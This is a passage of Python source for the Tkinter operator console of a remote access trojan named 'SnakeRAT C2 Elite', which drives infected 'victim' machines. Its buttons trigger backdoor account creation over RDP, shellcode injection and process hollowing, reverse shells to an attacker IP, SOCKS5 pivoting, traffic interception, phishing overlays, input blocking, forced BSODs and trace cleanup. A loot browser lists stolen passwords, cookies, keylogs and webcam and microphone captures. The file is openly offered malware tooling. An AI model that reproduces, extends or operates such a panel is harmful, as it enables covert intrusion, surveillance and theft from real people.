        btn(rdp,'Enable RDP',lambda:self.send('enable_rdp',{'add_user':False}),bg='#0369a1').pack(anchor='w',pady=2)
        r2=tk.Frame(rdp,bg=PANEL); r2.pack(fill='x',pady=3)
        lbl(r2,'User:').pack(side='left')
        self.ru=tk.StringVar(value='svcadmin'); ent(r2,tv=self.ru,w=12).pack(side='left',padx=4)
        lbl(r2,'Pass:').pack(side='left')
        self.rpass=tk.StringVar(value='P@ssw0rd!'); ent(r2,tv=self.rpass,w=12).pack(side='left',padx=4)
        btn(r2,'RDP + Add User',lambda:self.send('enable_rdp',{'add_user':True,'username':self.ru.get(),'password':self.rpass.get()}),bg=RED).pack(side='left',padx=3)

        sh_title(R,'Evasion & Cleanup')
        ev=tk.Frame(R,bg=PANEL,pady=8,padx=10); ev.pack(fill='x',pady=(0,6))
        for t,cmd,c in [('Clean Traces',lambda:self.send('clean_traces'),'#7c2d12'),
                        ('Self-Destruct',lambda:self.send('self_destruct'),RED),
                        ('Panic/BSOD',lambda:self.send('panic'),RED),
                        ('BSOD',lambda:self.send('bsod'),RED)]:
            btn(ev,t,cmd,bg=c,py=4,px=7).pack(side='left',padx=2)

        sh_title(R,'WMI & Code Injection')
        wmi=tk.Frame(R,bg=PANEL,pady=8,padx=10); wmi.pack(fill='x',pady=(0,6))
        r1=tk.Frame(wmi,bg=PANEL); r1.pack(fill='x',pady=2)
        lbl(r1,'WMI Program:',fg=TEXT2).pack(side='left')
        self.wpr=tk.StringVar(); ent(r1,tv=self.wpr,w=30).pack(side='left',padx=4)
        btn(r1,'WMI Install',lambda:self.send('wmi',{'command':self.wpr.get() or None}),bg=RED).pack(side='left',padx=3)
        r2=tk.Frame(wmi,bg=PANEL); r2.pack(fill='x',pady=4)
        lbl(r2,'PID:',fg=TEXT2).pack(side='left')
        self.ipid=tk.StringVar(); ent(r2,tv=self.ipid,w=8).pack(side='left',padx=3)
        lbl(r2,'Shellcode:').pack(side='left')
        self.isc=tk.StringVar(); ent(r2,tv=self.isc,w=20).pack(side='left',padx=3)
        btn(r2,'Browse',self._bsc,bg=BG3,fg=TEXT2,py=3).pack(side='left',padx=2)
        btn(r2,'Inject',self._inj,bg=RED).pack(side='left',padx=3)
        r3=tk.Frame(wmi,bg=PANEL); r3.pack(fill='x',pady=4)
        lbl(r3,'Hollow EXE:',fg=TEXT2).pack(side='left')
        self.hex=tk.StringVar(); ent(r3,tv=self.hex,w=18).pack(side='left',padx=3)
        lbl(r3,'Shellcode:').pack(side='left')
        self.hsc=tk.StringVar(); ent(r3,tv=self.hsc,w=18).pack(side='left',padx=3)
        btn(r3,'Browse',self._bhsc,bg=BG3,fg=TEXT2,py=3).pack(side='left',padx=2)
        btn(r3,'Hollow',self._hol,bg=RED).pack(side='left',padx=3)

    def _bsc(self):
        p=filedialog.askopenfilename(filetypes=[('Binary','*.bin'),('All','*.*')])
        if p: self.isc.set(p)
    def _bhsc(self):
        p=filedialog.askopenfilename(filetypes=[('Binary','*.bin'),('All','*.*')])
        if p: self.hsc.set(p)
    def _inj(self):
        pid=self.ipid.get().strip(); sc=self.isc.get().strip()
        if not pid or not sc: messagebox.showwarning('Missing','PID and shellcode required'); return
        try:
            with open(sc,'rb') as f: data=base64.b64encode(f.read()).decode()
            self.send('inject',{'pid':pid,'shellcode':data})
        except Exception as e: messagebox.showerror('Error',str(e))
    def _hol(self):
        exe=self.hex.get().strip(); sc=self.hsc.get().strip()
        if not exe or not sc: messagebox.showwarning('Missing','EXE and shellcode required'); return
        try:
            with open(sc,'rb') as f: data=base64.b64encode(f.read()).decode()
            self.send('hollow',{'program':exe,'shellcode':data})
        except Exception as e: messagebox.showerror('Error',str(e))
# ═══════════════════════════════════════════════════════════════════
# TAB 7 - Network
# ═══════════════════════════════════════════════════════════════════
class NetworkTab(ScrollableTab):
    def __init__(self,p,app): super().__init__(p,app); self._build()

    def _build(self):
        hdr=tk.Frame(self.container,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
        lbl(hdr,'Network & Pivoting',f=FH2,fg=ACCENT).pack(side='left')
        main=tk.Frame(self.container,bg=BG,padx=12); main.pack(fill='both',expand=True,pady=4)

        sh_title(main,'Port Scan')
        sf=tk.Frame(main,bg=PANEL,pady=8,padx=10); sf.pack(fill='x',pady=(0,7))
        r=tk.Frame(sf,bg=PANEL); r.pack(fill='x')
        lbl(r,'Target IP:').pack(side='left')
        self.sip=tk.StringVar(value='192.168.1.1'); ent(r,tv=self.sip,w=16).pack(side='left',padx=5)
        lbl(r,'Ports:').pack(side='left')
        self.spo=tk.StringVar(value='1-1024'); ent(r,tv=self.spo,w=10).pack(side='left',padx=5)
        btn(r,'Scan',lambda:self.send('port_scan',{'target':self.sip.get(),'ports':self.spo.get()}),bg=ACCENT2,py=5).pack(side='left',padx=5)

        sh_title(main,'SOCKS5 Proxy')
        pkf=tk.Frame(main,bg=PANEL,pady=8,padx=10); pkf.pack(fill='x',pady=(0,7))
        r=tk.Frame(pkf,bg=PANEL); r.pack(fill='x')
        lbl(r,'Port:').pack(side='left')
        self.skp=tk.IntVar(value=1080); ent(r,tv=self.skp,w=8).pack(side='left',padx=5)
        btn(r,'Start SOCKS5',lambda:self.send('socks',{'port':self.skp.get()}),bg=GREEN,py=5).pack(side='left',padx=5)

        sh_title(main,'Reverse Shell')
        rf=tk.Frame(main,bg=PANEL,pady=8,padx=10); rf.pack(fill='x',pady=(0,7))
        r=tk.Frame(rf,bg=PANEL); r.pack(fill='x')
        lbl(r,'Attacker IP:').pack(side='left')
        self.rip=tk.StringVar(value='10.0.0.1'); ent(r,tv=self.rip,w=16).pack(side='left',padx=5)
        lbl(r,'Port:').pack(side='left')
        self.rpo=tk.IntVar(value=4445); ent(r,tv=self.rpo,w=8).pack(side='left',padx=5)
        btn(r,'Spawn Revshell',lambda:self.send('reverse_shell',{'ip':self.rip.get(),'port':self.rpo.get()}),bg=RED,py=5).pack(side='left',padx=5)

        sh_title(main,'Traffic Interception (MITM Proxy)')
        tf=tk.Frame(main,bg=PANEL,pady=8,padx=10); tf.pack(fill='x',pady=(0,7))
        r1=tk.Frame(tf,bg=PANEL); r1.pack(fill='x',pady=2)
        lbl(r1,'Proxy Port:').pack(side='left')
        self.icp=tk.IntVar(value=8080); ent(r1,tv=self.icp,w=8).pack(side='left',padx=5)
        btn(r1,'Start Intercept',lambda:self.send('interception',{'action':'start','port':self.icp.get()}),bg=ACCENT2,py=4).pack(side='left',padx=4)
        r2=tk.Frame(tf,bg=PANEL); r2.pack(fill='x',pady=4)
        for t,a,extra in [
            ('Monitor ON','toggle_monitor',{'enabled':True}),
            ('Monitor OFF','toggle_monitor',{'enabled':False}),
            ('Intercept ON','toggle_intercept',{'enabled':True}),
            ('Intercept OFF','toggle_intercept',{'enabled':False}),
            ('SysProxy ON','system_proxy',{'enabled':True}),
            ('SysProxy OFF','system_proxy',{'enabled':False}),
            ('Stop','stop',{})]:
            p={**extra,'action':a}
            btn(r2,t,lambda _p=p:self.send('interception',_p),bg=ACCENT2,py=3,px=5).pack(side='left',padx=2)

        sh_title(main,'Quick Network Info')
        qf=tk.Frame(main,bg=PANEL,pady=8,padx=10); qf.pack(fill='x',pady=(0,7))
        btn(qf,'Netstat',lambda:self.send('netstat'),bg=ACCENT2,py=4).pack(side='left',padx=4)
        btn(qf,'ARP Table',lambda:self.send('arp'),bg=ACCENT2,py=4).pack(side='left',padx=4)

# ═══════════════════════════════════════════════════════════════════
# TAB 8 - Interaction
# ═══════════════════════════════════════════════════════════════════
class InteractionTab(ScrollableTab):
    def __init__(self,p,app): super().__init__(p,app); self._build()

    def _build(self):
        hdr=tk.Frame(self.container,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
        lbl(hdr,'Remote Interaction',f=FH2,fg=ACCENT).pack(side='left')
        main=tk.Frame(self.container,bg=BG,padx=12); main.pack(fill='both',expand=True,pady=4)
        L=tk.Frame(main,bg=BG); L.pack(side='left',fill='both',expand=True,padx=(0,6))
        R=tk.Frame(main,bg=BG); R.pack(side='left',fill='both',expand=True)

        sh_title(L,'Open URL on Victim')
        uf=tk.Frame(L,bg=PANEL,pady=8,padx=10); uf.pack(fill='x',pady=(0,6))
        self.uv=tk.StringVar(value='https://'); ent(uf,tv=self.uv,w=42).pack(anchor='w',pady=3)
        btn(uf,'Open URL',lambda:self.send('open_url',{'url':self.uv.get()}),bg=ACCENT2).pack(anchor='w')

        sh_title(L,'Message Box Popup')
        mf=tk.Frame(L,bg=PANEL,pady=8,padx=10); mf.pack(fill='x',pady=(0,6))
        self.mt=tk.StringVar(value='Hello from Admin')
        ent(mf,tv=self.mt,w=42).pack(anchor='w',pady=3)
        btn(mf,'Show Message',lambda:self.send('message_box',{'title':'Admin','text':self.mt.get()}),bg=ACCENT2).pack(anchor='w')

        sh_title(L,'Change Wallpaper')
        wf=tk.Frame(L,bg=PANEL,pady=8,padx=10); wf.pack(fill='x',pady=(0,6))
        self.wv=tk.StringVar(); ent(wf,tv=self.wv,w=42).pack(anchor='w',pady=3)
        btn(wf,'Set Wallpaper',lambda:self.send('wallpaper',{'path':self.wv.get()}),bg=ACCENT2).pack(anchor='w')

        sh_title(L,'Run Python Script on Victim')
        scrf=tk.Frame(L,bg=PANEL,pady=8,padx=10); scrf.pack(fill='x',pady=(0,6))
        r=tk.Frame(scrf,bg=PANEL); r.pack(fill='x')
        self.scv=tk.StringVar(); ent(r,tv=self.scv,w=32).pack(side='left',padx=3)
        btn(r,'Browse',self._bsc,bg=BG3,fg=TEXT2,py=4).pack(side='left',padx=3)
        btn(scrf,'Upload & Execute',self._rsc,bg=ACCENT2).pack(anchor='w',pady=4)

        sh_title(R,'Mouse & Keyboard Control')
        inp=tk.Frame(R,bg=PANEL,pady=8,padx=10); inp.pack(fill='x',pady=(0,6))
        r1=tk.Frame(inp,bg=PANEL); r1.pack(fill='x',pady=2)
        lbl(r1,'X:').pack(side='left')
        self.mx=tk.IntVar(value=0); ent(r1,tv=self.mx,w=7).pack(side='left',padx=4)
        lbl(r1,'Y:').pack(side='left')
        self.my=tk.IntVar(value=0); ent(r1,tv=self.my,w=7).pack(side='left',padx=4)
        r2=tk.Frame(inp,bg=PANEL); r2.pack(fill='x',pady=4)
        for t,a in [('Move','move'),('Left Click','click'),('Right Click','rclick')]:
            btn(r2,t,lambda _a=a:self.send('input_control',{'action':_a,'x':self.mx.get(),'y':self.my.get(),'button':'left','text':''}),
                bg=ACCENT2,py=4,px=6).pack(side='left',padx=2)
        r3=tk.Frame(inp,bg=PANEL); r3.pack(fill='x',pady=4)
        lbl(r3,'Type text:').pack(side='left')
        self.tv=tk.StringVar(); ent(r3,tv=self.tv,w=28).pack(side='left',padx=5)
        btn(r3,'Type',lambda:self.send('input_control',{'action':'type','x':0,'y':0,'button':'left','text':self.tv.get()}),bg=ACCENT2,py=4).pack(side='left',padx=3)

        sh_title(R,'Block / Unblock Input')
        blk=tk.Frame(R,bg=PANEL,pady=8,padx=10); blk.pack(fill='x',pady=(0,6))
        r=tk.Frame(blk,bg=PANEL); r.pack(fill='x')
        btn(r,'Block Input',lambda:self.send('block_input',{'action':'block'}),bg=RED,py=5).pack(side='left',padx=4)
        btn(r,'Unblock Input',lambda:self.send('block_input',{'action':'unblock'}),bg=GREEN,py=5).pack(side='left',padx=4)

        sh_title(R,'Phishing Overlay')
        ph=tk.Frame(R,bg=PANEL,pady=8,padx=10); ph.pack(fill='x',pady=(0,6))
        r=tk.Frame(ph,bg=PANEL); r.pack(fill='x')
        lbl(r,'Template:').pack(side='left')
        self.pht=tk.StringVar(value='windows')
        cmb(r,['windows','office','google','custom'],tv=self.pht,w=12).pack(side='left',padx=5)
        btn(r,'Launch Phishing',lambda:self.send('phishing',{'template':self.pht.get()}),bg=RED,py=4).pack(side='left',padx=4)

        sh_title(R,'Misc Remote Actions')
        misc=tk.Frame(R,bg=PANEL,pady=8,padx=10); misc.pack(fill='x',pady=(0,6))
        r=tk.Frame(misc,bg=PANEL); r.pack(fill='x')
        for t,cmd,c in [
            ('Kill Browser',lambda:self.send('close_browser'),RED),
            ('Block Apps',lambda:self.send('block_apps',{'action':'on'}),ORANGE),
            ('Unblock Apps',lambda:self.send('block_apps',{'action':'off'}),BG3),
            ('Abort All',lambda:self.send('abort',{'task_id':'all'}),'#7c2d12'),
            ('Autorun…',self._autorun,ACCENT2)]:
            btn(r,t,cmd,bg=c,fg='white' if c!=BG3 else TEXT2,py=4,px=5).pack(side='left',padx=2)

    def _bsc(self):
        p=filedialog.askopenfilename(filetypes=[('Python','*.py'),('All','*.*')])
        if p: self.scv.set(p)
    def _rsc(self):
        path=self.scv.get().strip()
        if not path: messagebox.showwarning('Missing','Select a script'); return
        try: self.send('script',{'code':open(path).read()})
        except Exception as e: messagebox.showerror('Error',str(e))
    def _autorun(self):
        val=simpledialog.askstring('Autorun','Enter JSON array of command objects:',parent=self)
        if val:
            try: self.send('set_autorun',{'commands':json.loads(val)})
            except Exception as e: messagebox.showerror('JSON Error',str(e))
# ═══════════════════════════════════════════════════════════════════
# TAB 9 - Loot
# ═══════════════════════════════════════════════════════════════════
class LootTab(Base):
    def __init__(self,p,app): super().__init__(p,app); self._build()

    def _build(self):
        hdr=tk.Frame(self,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
        lbl(hdr,'Loot & Collected Data',f=FH2,fg=ACCENT).pack(side='left')
        btn(hdr,'Refresh',self.refresh,bg=BG3,fg=ACCENT,py=4).pack(side='right')
        btn(hdr,'Open Loot Dir',self._ol,bg=ACCENT2,py=4).pack(side='right',padx=6)
        frm=tk.Frame(self,bg=BG,padx=12,pady=4); frm.pack(fill='both',expand=True)
        cols=('Client','Type','Filename','Size','Timestamp','Path')
        self.tree=ttk.Treeview(frm,columns=cols,show='headings',height=20)
        s=ttk.Style()
        s.configure('Treeview',background=BG2,foreground=TEXT,fieldbackground=BG2,rowheight=24,font=FMS)
        s.configure('Treeview.Heading',background=BG3,foreground=ACCENT,font=FB)
        for c,w in zip(cols,[130,90,200,80,160,250]):
            self.tree.heading(c,text=c); self.tree.column(c,width=w,anchor='w')
        vsb=ttk.Scrollbar(frm,orient='vertical',command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        vsb.pack(side='right',fill='y'); self.tree.pack(fill='both',expand=True)
        self.tree.bind('<Double-1>',self._open)
        ff=tk.Frame(self,bg=BG,padx=12,pady=6); ff.pack(fill='x')
        lbl(ff,'Filter Type:').pack(side='left')
        self.ft=tk.StringVar(value='all')
        cmb(ff,['all','screenshot','webcam','keylog','passwords','cookies','wifi','file','microphone','packets','recordings'],tv=self.ft,w=18).pack(side='left',padx=5)
        btn(ff,'Apply',self.refresh,bg=ACCENT2,py=4).pack(side='left',padx=4)

    def refresh(self):
        self.tree.delete(*self.tree.get_children())
        if not self.srv: return
        t=self.ft.get()
        try:
            if t=='all':
                rows=self.srv.db._conn_sqlite().execute('SELECT client_id,type,filename,size,timestamp,path FROM loot ORDER BY timestamp DESC LIMIT 500').fetchall()
            else:
                rows=self.srv.db._conn_sqlite().execute('SELECT client_id,type,filename,size,timestamp,path FROM loot WHERE type=? ORDER BY timestamp DESC LIMIT 500',(t,)).fetchall()
            for r in rows:
                sz=f'{r[3]//1024} KB' if r[3] and r[3]>=1024 else f'{r[3] or 0} B'
                self.tree.insert('','end',values=(r[0],r[1],r[2],sz,r[4],r[5] or ''))
        except Exception as e: self.log(f'Loot refresh err: {e}','FAIL')

    def _open(self,_=None):
        s=self.tree.selection()
        if not s: return
        p=self.tree.item(s[0])['values'][5]
        if p and os.path.isfile(p): os.startfile(p)

    def _ol(self):
        d=Path('loot'); d.mkdir(exist_ok=True)
        os.startfile(str(d.resolve()))

# ═══════════════════════════════════════════════════════════════════
# TAB 10 - Config
# ═══════════════════════════════════════════════════════════════════
class ConfigTab(ScrollableTab):
    def __init__(self,p,app): super().__init__(p,app); self._build()

    def _build(self):
        hdr=tk.Frame(self.container,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
        lbl(hdr,'Configuration & DB Control',f=FH2,fg=ACCENT).pack(side='left')
        main=tk.Frame(self.container,bg=BG,padx=12); main.pack(fill='both',expand=True,pady=6)

        sh_title(main,'Database Mode (MongoDB vs SQLite)')
        dbf=tk.Frame(main,bg=PANEL,pady=10,padx=10); dbf.pack(fill='x',pady=(0,8))
        self.dblbl=tk.Label(dbf,text='Mode: SQLite (Normal)',font=FH3,fg=GREEN,bg=PANEL)
        self.dblbl.pack(anchor='w',pady=3)
        r=tk.Frame(dbf,bg=PANEL); r.pack(fill='x',pady=4)
        btn(r,'Switch to MongoDB',lambda:self._sw('mongo'),bg='#7c2d12').pack(side='left',padx=4)
        btn(r,'Switch to SQLite',lambda:self._sw('sqlite'),bg='#166534').pack(side='left',padx=4)
        btn(r,'Check Current Mode',self._chk,bg=BG3,fg=TEXT2).pack(side='left',padx=4)

        sh_title(main,'Client DB Mode')
        cdf=tk.Frame(main,bg=PANEL,pady=10,padx=10); cdf.pack(fill='x',pady=(0,8))
        lbl(cdf,'Command connected client(s) to switch db mode:').pack(anchor='w')
        r2=tk.Frame(cdf,bg=PANEL); r2.pack(fill='x',pady=4)
        btn(r2,'Client -> MongoDB',lambda:self.send('dbmode_client',{'mode':'mongo'}),bg='#7c2d12').pack(side='left',padx=4)
        btn(r2,'Client -> Normal (TCP)',lambda:self.send('dbmode_client',{'mode':'normal'}),bg='#166534').pack(side='left',padx=4)

        sh_title(main,'Server Configuration Settings')
        scf=tk.Frame(main,bg=PANEL,pady=10,padx=10); scf.pack(fill='x',pady=(0,8))
        self.cfg_vars={}
        fields=[
            ('Host:','host','0.0.0.0'),
            ('Port:','port','4444'),
            ('Encryption Key:','enc_key','AdvancedSnakeRAT_2024_CrossPlatform'),
            ('Loot Directory:','loot_dir','loot'),
            ('Log File:','log_file','c2_server.log'),
            ('Heartbeat Timeout (s):','hb_timeout','120'),
        ]
        for lbl_t,k,def_val in fields:
            row=tk.Frame(scf,bg=PANEL); row.pack(fill='x',pady=2)
            lbl(row,lbl_t,w=24,anchor='w').pack(side='left')
            v=tk.StringVar(value=def_val); self.cfg_vars[k]=v
            ent(row,tv=v,w=40).pack(side='left',padx=5)
        btn(scf,'Apply Settings (requires restart)',self._apply,bg=ORANGE).pack(anchor='w',pady=6)

        sh_title(main,'MongoDB Connection URI (.env)')
        mf=tk.Frame(main,bg=PANEL,pady=10,padx=10); mf.pack(fill='x',pady=(0,8))
        self.muri=tk.StringVar(value=os.environ.get('MONGODB_URI',''))
        ent(mf,tv=self.muri,w=64).pack(anchor='w',pady=4)
        btn(mf,'Save to .env',self._senv,bg=ACCENT2).pack(anchor='w')

    def _sw(self,m):
        if not self.srv: return
        try:
            um=(m=='mongo')
            self.srv.db.switch_mode(um,server=self.srv)
            cur='MongoDB Atlas' if um else 'SQLite (Normal)'
            self.dblbl.config(text=f'Mode: {cur}',fg=ACCENT if um else GREEN)
            self.log(f'DB mode switched to {cur}','OK')
        except Exception as e: messagebox.showerror('DB Mode Switch Error',str(e))

    def _chk(self):
        if self.srv:
            m='MongoDB Atlas' if self.srv.db.use_mongo else 'SQLite (Normal)'
            self.dblbl.config(text=f'Mode: {m}',fg=ACCENT if self.srv.db.use_mongo else GREEN)
            self.log(f'Current database mode is {m}','INFO')

    def _apply(self):
        messagebox.showinfo('Config Info','Configuration applied on next server startup.')

    def _senv(self):
        u=self.muri.get().strip(); ep=Path('.env')
        ls=[]
        if ep.exists():
            with open(ep,'r') as f: ls=f.readlines()
        nls=[]; fnd=False
        for l in ls:
            if l.startswith('MONGODB_URI='): nls.append(f'MONGODB_URI={u}\n'); fnd=True
            else: nls.append(l)
        if not fnd: nls.append(f'MONGODB_URI={u}\n')
        with open(ep,'w') as f: f.writelines(nls)
        os.environ['MONGODB_URI']=u; self.log('Saved to .env','OK')
# ═══════════════════════════════════════════════════════════════════
# C2 Main GUI Application
# ═══════════════════════════════════════════════════════════════════
class C2GUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('SnakeRAT C2 Elite — Advanced GUI')
        self.geometry('1400x860'); self.minsize(1200,760); self.configure(bg=BG)
        self.protocol('WM_DELETE_WINDOW',self._close)

        self.server=None; self.selected_client=None; self.q=queue.Queue()
        self._build_ui(); self._start_pump(); self._sched_ref()

    def _build_ui(self):
        # Top panel
        tp=tk.Frame(self,bg=BG3,pady=8); tp.pack(fill='x',side='top')
        lbl(tp,'SnakeRAT C2 Elite',f=FH1,fg=ACCENT,px=14).pack(side='left')

        # Port ctrl
        ctrl=tk.Frame(tp,bg=BG3); ctrl.pack(side='left',padx=20)
        lbl(ctrl,'Port:',fg=TEXT2,bg=BG3).pack(side='left')
        self.pv=tk.StringVar(value=os.environ.get('PORT','4444'))
        ent(ctrl,tv=self.pv,w=7).pack(side='left',padx=6)
        self.s_btn=btn(ctrl,'Start Server',self._start_srv,bg=GREEN,py=5,px=12)
        self.s_btn.pack(side='left',padx=4)
        self.st_btn=btn(ctrl,'Stop Server',self._stop_srv,bg=RED,py=5,px=12)
        self.st_btn.pack(side='left',padx=4); self.st_btn.config(state='disabled')

        # Status indicators
        rb=tk.Frame(tp,bg=BG3); rb.pack(side='right',padx=14)
        self.srv_st=tk.Label(rb,text='Offline',font=FB,fg=RED,bg=BG3,padx=8)
        self.srv_st.pack(side='left')
        self.cli_lbl=tk.Label(rb,text='Target: broadcast',font=FB,fg=YELLOW,bg=BG3,padx=8)
        self.cli_lbl.pack(side='left')
        self.lcount=tk.Label(rb,text='0 clients',font=FB,fg=ACCENT,bg=BG3,padx=8)
        self.lcount.pack(side='left')

        sep(self).pack(fill='x')

        # Paned Window
        pw=tk.PanedWindow(self,orient='vertical',bg=BG,sashrelief='flat',sashwidth=4)
        pw.pack(fill='both',expand=True)

        # Tabs
        nbf=tk.Frame(pw,bg=BG); pw.add(nbf,minsize=520)
        s=ttk.Style()
        s.configure('Dark.TNotebook',background=BG,borderwidth=0)
        s.configure('Dark.TNotebook.Tab',background=BG3,foreground=TEXT2,padding=[14,6],font=FB)
        s.map('Dark.TNotebook.Tab',background=[('selected',ACCENT2)],foreground=[('selected','white')])
        self.notebook=ttk.Notebook(nbf,style='Dark.TNotebook')
        self.notebook.pack(fill='both',expand=True,padx=4,pady=4)

        self.tabs={}
        tab_defs=[
            ('Sessions',SessionsTab),
            ('Shell',ShellTab),
            ('Surveillance',SurveillanceTab),
            ('Credentials',CredsTab),
            ('Files',FilesTab),
            ('System',SystemTab),
            ('Network',NetworkTab),
            ('Interaction',InteractionTab),
            ('Loot',LootTab),
            ('Config',ConfigTab)
        ]
        for name,cls in tab_defs:
            tab=cls(self.notebook,self)
            self.notebook.add(tab,text=f'  {name}  ')
            self.tabs[name]=tab

        # Logs
        lf=tk.Frame(pw,bg=BG2); pw.add(lf,minsize=140)
        lh=tk.Frame(lf,bg=BG2); lh.pack(fill='x',padx=8,pady=(4,0))
        lbl(lh,'Server Log',f=FH3,fg=ACCENT).pack(side='left')
        btn(lh,'Clear',self._clg,bg=BG3,fg=TEXT2,py=3,px=8).pack(side='right')
        self.la=stxt(lf,h=8); self.la.pack(fill='both',expand=True,padx=8,pady=4)
        self.la.config(state='disabled')
        for tg,col in [('OK',ACCENT),('INFO',GREEN),('WARN',YELLOW),('FAIL',RED),('DEBUG','#a855f7'),('RESULT',TEXT)]:
            self.la.tag_configure(tg,foreground=col)

        # Results
        rf=tk.Frame(pw,bg=BG3); pw.add(rf,minsize=90)
        lbl(rf,'Command Results',f=FH3,fg=ACCENT,px=8,py=4).pack(anchor='w')
        self.ra=stxt(rf,h=6); self.ra.pack(fill='both',expand=True,padx=8,pady=4)
        self.ra.config(state='disabled')

    def _start_srv(self):
        if self.server and self.server.running: return
        try: p=int(self.pv.get())
        except: messagebox.showerror('Port','Invalid port'); return

        cfg=ServerConfig(port=p)
        self.server=AdvancedC2Server(cfg)
        self.server.logger=GUILogger(cfg.log_file,cfg.debug,self.q)

        # Hook handle_msg to capture results
        orig_handle_msg=self.server._handle_msg
        def hook_msg(cid,msg):
            orig_handle_msg(cid,msg)
            if msg.get('type')=='result':
                self.q.put(('result',cid,msg.get('data')))
        self.server._handle_msg=hook_msg

        threading.Thread(target=self._run_srv,daemon=True).start()
        self.srv_st.config(text='Running',fg=GREEN)
        self.s_btn.config(state='disabled')
        self.st_btn.config(state='normal')
        self.add_log(f'Server started on port {p}','OK')

    def _run_srv(self):
        try: self.server.start()
        except Exception as e: self.q.put(('log','ERR','FAIL',str(e),RED))

    def _stop_srv(self):
        if self.server:
            self.server.running=False; self.add_log('Server stopping...','WARN')
        self.srv_st.config(text='Offline',fg=RED)
        self.s_btn.config(state='normal'); self.st_btn.config(state='disabled')

    def send_command(self,ct,params=None):
        if not self.server or not self.server.running:
            messagebox.showwarning('Offline','Start the server first.'); return
        targs=([self.selected_client] if self.selected_client else list(self.server.clients.keys()))
        if not targs: self.add_log('No targeted clients connected','WARN'); return
        self.server.send_command(targs,ct,params or {})
        self.add_log(f'-> {ct} -> {len(targs)} clients','INFO')

    def select_client(self,cid):
        self.selected_client=cid
        if cid:
            if self.server: self.server.selected_client=cid
            self.cli_lbl.config(text=f'Target: {cid[:18]}')
        else:
            if self.server: self.server.selected_client=None
            self.cli_lbl.config(text='Target: broadcast')

    def _start_pump(self): self._pump()

    def _pump(self):
        try:
            while True:
                item=self.q.get_nowait()
                if item[0]=='log':
                    _,ts,lv,msg,col=item
                    self._wlg(f'[{ts}] [{lv}] {msg}\n',lv)
                elif item[0]=='result':
                    _,cid,data=item
                    self._wres(cid,data)
                    if hasattr(self.tabs.get('Shell'),'inject'):
                        self.tabs['Shell'].inject(data)
        except queue.Empty: pass
        self.after(100,self._pump)

    def _wlg(self,t,tg='INFO'):
        self.la.config(state='normal'); self.la.insert('end',t,tg)
        self.la.see('end'); self.la.config(state='disabled')

    def _wres(self,cid,d):
        self.ra.config(state='normal'); self.ra.insert('end',f'\n[{cid[:14]}] ','sel')
        if isinstance(d,dict):
            if d.get('stdout'): self.ra.insert('end',d['stdout'])
            if d.get('stderr'): self.ra.insert('end',f"STDERR: {d['stderr']}")
        else: self.ra.insert('end',str(d))
        self.ra.insert('end','\n' + '─'*60 + '\n')
        self.ra.see('end'); self.ra.config(state='disabled')

    def add_log(self,m,lv='INFO'):
        ts=datetime.datetime.now().strftime('%H:%M:%S')
        self._wlg(f'[{ts}] [{lv}] {m}\n',lv)

    def _clg(self):
        self.la.config(state='normal'); self.la.delete('1.0','end'); self.la.config(state='disabled')

    def _sched_ref(self):
        self._doref(); self.after(3000,self._sched_ref)

    def _doref(self):
        if self.server:
            with self.server.client_lock: n=len(self.server.clients)
            self.lcount.config(text=f'{n} clients')
        try: self.tabs['Sessions'].refresh()
        except: pass

    def _close(self):
        if self.server: self.server.running=False
        self.destroy()

def main():
    app=C2GUI(); app.mainloop()

if __name__ == '__main__':
    main()
